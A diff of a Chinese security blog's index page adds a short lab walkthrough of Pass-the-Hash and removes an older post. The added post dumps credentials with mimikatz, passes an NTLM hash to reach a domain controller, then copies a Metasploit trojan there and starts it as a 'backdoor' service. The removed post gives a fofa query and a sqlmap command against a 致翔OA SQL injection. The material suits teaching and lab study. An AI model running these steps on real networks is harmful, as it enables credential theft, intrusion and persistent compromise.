@@ -255,6 +255,100 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
+    <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.top/2023/03/16/%E6%B5%85%E6%B7%A1hash%E4%BC%A0%E9%80%92/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="十三">
+      <meta itemprop="description" content="潜心学习，不骄不躁">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="十三の博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/03/16/%E6%B5%85%E6%B7%A1hash%E4%BC%A0%E9%80%92/" class="post-title-link" itemprop="url">浅淡hash传递</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2023-03-16 16:36:55 / 修改时间：16:37:38" itemprop="dateCreated datePublished" datetime="2023-03-16T16:36:55+08:00">2023-03-16</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/basic/" itemprop="url" rel="index"><span itemprop="name">-basic</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="浅淡hash传递"><a href="#浅淡hash传递" class="headerlink" title="浅淡hash传递"></a>浅淡hash传递</h1><p>本文只是粗略介绍一些hash传递，后续会发获取hash和hash传递方法的总结。</p>
+<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>Pass The Hash 即PTH，也是内网渗透中较为常见的一个术语，就是通过传递Windwos 本地账户或者域用户的hash值，达到控制其他服务器的目的</p>
+<p>在进入企业内网之后，如果是Windows PC或者服务器较多的环境,极有可能会使用到hash传递来进行内网的横传，现在企业内部一般对于口令强度均有一定的要求，抓取到本地hash后可能无法进行破解，同时从Windows Vista和Windows Server 2008开始，微软默认禁用LM hash.在Windows Server 2012 R2及之后版本的操作系统中，默认不会在内存中保存明文密码，这时可以通过传递hash来进行横传。</p>
+<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>hash 传递的原理是在认证过程中，并不是直接使用用户的密码进行认证的，而是使用用户的hash值，因此，攻击者可以直接通过LM Hash和NTLM Hash访问远程主机或服务，而不需要提供明文密码。在Windows系统中，通常会使用NTLM身份认证，NTLM是口令加密后的hash值。PTH是基于smb服务（139端口和445 端口）</p>
+<h1 id="简单实操"><a href="#简单实操" class="headerlink" title="简单实操"></a>简单实操</h1><p>首先用红日靶场1现成的环境搭建一个域环境，一共三台机器，一个web服务器，一个dc，一个域成员。</p>
+<p>现在模拟拿下了web服务器了，上传猕猴桃。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">首先用minikatz获取用户名和hash//需要管理员权限</span><br><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
+
+<p>虽然机器上抓到了明文密码，但是我们模拟没有抓到明文密码的情况</p>
+<p><img src="/2023/03/16/%E6%B5%85%E6%B7%A1hash%E4%BC%A0%E9%80%92/image-20230316161943981.png" alt="image-20230316161943981"></p>
+<p>现在拿域管理员的ntlm了</p>
+<p>然后，在 Windows 7 上用 mimikatz 将获取的 Administrator 的 Hash 添加进 lsass 进程中：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::pth /user:Administrator /domain:GOD /ntlm:8a963371a63944419ec1adf687bb1be5</span><br></pre></td></tr></table></figure>
+
+<p>成功，此时会自动弹出一个新的cmd窗口，这时访问远程主机或服务，就不用提供明文密码了，如下，我们列出了域控制器 DC 的c盘目录：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir  \\192.168.52.138\c$</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/03/16/%E6%B5%85%E6%B7%A1hash%E4%BC%A0%E9%80%92/image-20230316163307037.png" alt="image-20230316163307037"></p>
+<p><img src="/2023/03/16/%E6%B5%85%E6%B7%A1hash%E4%BC%A0%E9%80%92/image-20230316163524101.png" alt="image-20230316163524101"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe privilege::debug &quot;sekurlsa::pth /domain:GOD /user:Administrator /ntlm:8a963371a63944419ec1adf687bb1be5 /run:cmd.exe&quot; </span><br></pre></td></tr></table></figure>
+
+<p>此时，为了让域控制器 DC 上线 Metasploit，我们只需做以下工作。</p>
+<p>生成一个msf木马shell.exe，将shell.exe上传到Windows 7主机，然后直接使用 copy 命令将shell.exe复制到域控上：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy shell.exe \\DC.whoamianony.org\c$    // 将 shell.exe 复制到域控主机上</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sc \\DC.whoamianony.org create backdoor binpath= &quot;c:\shell.exe&quot;// 在域控上创建服务启动木马</span><br><span class="line">sc \\DC.whoamianony.org start backdoor     // 在域控上立即启动该服务</span><br><span class="line">sc \\DC.whoamianony.org delete backdoor     // 在域控上立即删除该服务</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
     <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.top/2023/03/15/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%91MSSQL-xp-cmdshell%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -405,81 +499,10 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
-    <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.top/2023/03/08/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%91%E8%87%B4%E7%BF%94OA-msglog-aspx-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="十三">
-      <meta itemprop="description" content="潜心学习，不骄不躁">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="十三の博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/03/08/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%91%E8%87%B4%E7%BF%94OA-msglog-aspx-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">【漏洞复现】致翔OA msglog.aspx SQL注入漏洞</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2023-03-08 19:49:59 / 修改时间：19:51:31" itemprop="dateCreated datePublished" datetime="2023-03-08T19:49:59+08:00">2023-03-08</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/fuxian/" itemprop="url" rel="index"><span itemprop="name">-fuxian</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="【漏洞复现】致翔OA-msglog-aspx-SQL注入漏洞"><a href="#【漏洞复现】致翔OA-msglog-aspx-SQL注入漏洞" class="headerlink" title="【漏洞复现】致翔OA msglog.aspx SQL注入漏洞"></a>【漏洞复现】致翔OA msglog.aspx SQL注入漏洞</h1><p>致翔OA是集成多个行业应用功能的OA协同办公平台,其核心机制是创新与合作,秉承开放的精神,可以提供嵌入式的OA系统开发支持。致翔OA msglog.aspx文件存在SQL注入漏洞，攻击者通过漏洞可获取敏感信息。</p>
-<h1 id="fofa语法"><a href="#fofa语法" class="headerlink" title="fofa语法"></a>fofa语法</h1><p><code>fofa:app=&quot;致翔软件-致翔OA&quot;</code></p>
-<h1 id="注入点"><a href="#注入点" class="headerlink" title="注入点"></a>注入点</h1><p><code>python sqlmap.py -u http://&#123;&#123;Hostname&#125;&#125;/mainpage/msglog.aspx?user=1 --dbs</code></p>
-<p><img src="/2023/03/08/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%91%E8%87%B4%E7%BF%94OA-msglog-aspx-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/image-20230308194937667.png" alt="image-20230308194937667"></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/17/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/17/">17</a><span class="page-number current">18</span><a class="page-number" href="/page/19/">19</a><span class="space">&hellip;</span><a class="page-number" href="/page/58/">58</a><a class="extend next" rel="next" href="/page/19/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
+    <a class="extend prev" rel="prev" href="/page/17/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/17/">17</a><span class="page-number current">18</span><a class="page-number" href="/page/19/">19</a><span class="space">&hellip;</span><a class="page-number" href="/page/59/">59</a><a class="extend next" rel="next" href="/page/19/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
   </nav>
 
 
@@ -547,7 +570,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">174</span>
+          <span class="site-state-item-count">175</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
